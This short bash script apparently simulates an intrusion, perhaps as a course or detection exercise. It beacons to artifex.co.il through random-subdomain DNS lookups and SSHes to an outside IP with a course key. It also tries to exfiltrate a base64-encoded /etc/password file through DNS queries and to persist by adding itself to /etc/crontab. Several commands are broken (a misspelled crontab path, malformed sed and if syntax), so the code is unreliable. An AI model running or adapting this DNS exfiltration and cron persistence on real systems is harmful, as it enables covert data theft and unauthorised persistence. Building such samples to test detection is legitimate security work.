#!/bin/bash

#Author: zina
#Email: zinka.mevzos@gmail.com


FILE=$(realpath ${0})


for i in {1..10}
do
	rand=$(echo $RANDOM | md5sum | awk '{print $1}')
	dig ${rand}.artifex.co.il
	sleep 10
done

sleep 300

ssh -i ~/.ssh/keys/snowbit_course 54.74.74.195

sleep 250

cat /etc/password | base64 -w5 | sed '/\n/.artifactory.com\n' | xargs dig @1.1

is_cron_updated=$(echo /etc/crtontab | grep "${FILE}" | wc -l)
if ${is_cron_updated}==0; then
	"* * * * ${FILE}" >> /etc/crontab
fi
